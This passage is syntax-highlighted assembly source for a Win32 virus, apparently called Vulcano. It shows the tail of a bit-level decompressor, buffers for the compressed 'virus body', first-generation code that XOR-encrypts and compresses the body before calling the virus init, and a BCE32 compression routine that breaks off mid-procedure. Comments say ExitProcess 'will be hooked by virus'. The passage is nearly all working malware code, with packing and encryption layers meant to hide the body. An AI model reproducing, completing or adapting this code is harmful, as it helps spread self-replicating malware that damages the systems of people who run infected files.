    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;and nulify parameter</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;decrement parameter</span><span class="sc0">
</span><span class="sc5">dnlb</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;next bit</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                </span><span class="sc1">;is it 1 ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nb</span><span class="sc0">                   </span><span class="sc1">;no, continue</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">;yeah, set bit</span><span class="sc0">
</span><span class="sc5">nb</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;next bit</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;increment parameter</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">bcopy</span><span class="sc0">              </span><span class="sc1">;and align next bits</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;restore ECX</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;test flags</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">d_bits</span><span class="sc0">              </span><span class="sc1">;if not sign, jump</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;delete pushed parameters</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all regs</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">decompressed</span><span class="sc0">
</span><span class="sc5">cbit</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;increment counter</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">               </span><span class="sc1">;byte full ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">n_byte</span><span class="sc0">              </span><span class="sc1">;no, continue</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;yeah, store byte</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;and prepare next one</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">                 </span><span class="sc1">;...</span><span class="sc0">
</span><span class="sc5">n_byte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;save back byte</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc5">Pshd</span><span class="sc0">        </span><span class="sc1">;quit from procedure with one parameter on stack</span><span class="sc0">
</span><span class="sc5">db1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">;2. bit in decryption key</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">;2 bit wide</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">testbits</span><span class="sc0">                </span><span class="sc1">;test bits</span><span class="sc0">
</span><span class="sc5">db2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">;4. bit</span><span class="sc0">
</span><span class="sc5">tb2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">;3 bit wide</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">testbits</span><span class="sc0">                </span><span class="sc1">;test bits</span><span class="sc0">

</span><span class="sc5">_compressed_</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">compressed</span><span class="sc4">+</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;here is stored compressed</span><span class="sc0">
                                                </span><span class="sc1">;virus body</span><span class="sc0">
</span><span class="sc5">decompressed</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">compressed</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;here decompressed</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">size_unint</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;and here all uninitialized</span><span class="sc0">
                                                </span><span class="sc1">;variables</span><span class="sc0">
</span><span class="sc5">virtual_end</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;end of virus in memory</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">                                           </span><span class="sc1">;start of code section</span><span class="sc0">
</span><span class="sc5">first_gen</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;first generation code</span><span class="sc0">
    </span><span class="sc1">;second layer of encryption</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encrypted</span><span class="sc0">       </span><span class="sc1">;encrypt from...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">encrypted</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">;encrypt how many bytes...</span><span class="sc0">
</span><span class="sc5">encrypt1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;get dword</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">;encrypt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;and store it</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">encrypt1</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">compressed</span><span class="sc0">              </span><span class="sc1">;source</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_compressed_</span><span class="sc0">            </span><span class="sc1">;destination</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">compressed</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">;size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">workspace1</span><span class="sc0">              </span><span class="sc1">;workspace1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">workspace2</span><span class="sc0">              </span><span class="sc1">;workspace2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">BCE32_Compress</span><span class="sc0">                     </span><span class="sc1">;Compress virus body!</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;save compressed virus size</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;parameter for GetModuleHandleA</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">VulcanoInit</span><span class="sc0">            </span><span class="sc1">;call virus code</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;parameter for ExitProcess</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">            </span><span class="sc1">;this will be hooked by virus l8r</span><span class="sc0">

</span><span class="sc1">;Compression routine from BCE32 starts here. This is used only in first gen.</span><span class="sc0">

</span><span class="sc5">BCE32_Compress</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;save all regs</span><span class="sc0">
</span><span class="sc1">;stage 1</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;and again</span><span class="sc0">
</span><span class="sc5">create_table</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;save for l8r usage</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;ECX = 4</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;load byte to AL</span><span class="sc0">
</span><span class="sc5">l_table</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;EDX = 0</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;this stuff will separate and test</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">st_end</span><span class="sc0">               </span><span class="sc1">;bit groups</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc8">st2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc8">st3</span><span class="sc0">
</span><span class="sc8">st1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;01</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">st_end</span><span class="sc0">
</span><span class="sc8">st2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;10</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">st_end</span><span class="sc0">
</span><span class="sc8">st3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;11</span><span class="sc0">
</span><span class="sc5">st_end</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;increment count in table</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">;next bit group</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">l_table</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;restore number of bytes</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">create_table</span><span class="sc0">           </span><span class="sc1">;next byte</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;this will check for same numbers</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;ECX = 4</span><span class="sc0">
</span><span class="sc5">re_t</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cdq</span><span class="sc0">                 </span><span class="sc1">;EDX = 0</span><span class="sc0">
</span><span class="sc5">t_loop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;load DWORD</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;increment it</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;test for same numbers</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_inc_</span><span class="sc0">                </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_inc_</span><span class="sc0">                </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_inc_</span><span class="sc0">                </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ninc_</span><span class="sc0">               </span><span class="sc1">;...</span><span class="sc0">
</span><span class="sc5">_inc_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;same, increment it</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;increment counter (check it in next turn)</span><span class="sc0">
</span><span class="sc5">ninc_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;table overflow ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">re_t</span><span class="sc0">                 </span><span class="sc1">;yeah, once again</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;increment offset to table</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">t_loop</span><span class="sc0">             </span><span class="sc1">;loop</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore regs</span><span class="sc0">

</span><span class="sc1">;stage 2</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;save all regs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;get pointer to table</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;EBX = 3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;ECX = 3</span><span class="sc0">
</span><span class="sc5">rep_sort</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;bubble sort = the biggest value will</span><span class="sc0">
                        </span><span class="sc1">;always "bubble up", so we know number</span><span class="sc0">
                        </span><span class="sc1">;steps</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;set pointerz</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;load DWORD (count)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;save it</span><span class="sc0">
</span><span class="sc5">sort</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;load next</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;is it bigger</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">noswap</span><span class="sc0">               </span><span class="sc1">;no, store it</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">               </span><span class="sc1">;yeah, swap DWORDs</span><span class="sc0">
</span><span class="sc5">noswap</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">sort</span><span class="sc0">               </span><span class="sc1">;next DWORD</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;biggest in EDX, swap it</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;and store</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;get back pointer</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;restore regs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">rep_sort</span><span class="sc0">               </span><span class="sc1">;and try next DWORD</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc1">;stage 3</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;save all regs</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;EAX = 0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;ECX = 4</span><span class="sc0">
</span><span class="sc5">n_search</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;save regs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;get pointer to table</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;store reg</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;load DWORD to EAX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;ECX = 3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;set pointerz</span><span class="sc0">
</span><span class="sc5">search</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;load next</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;end ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_search</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;next search</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">search</span><span class="sc0">
</span><span class="sc5">end_search</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;and next step</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
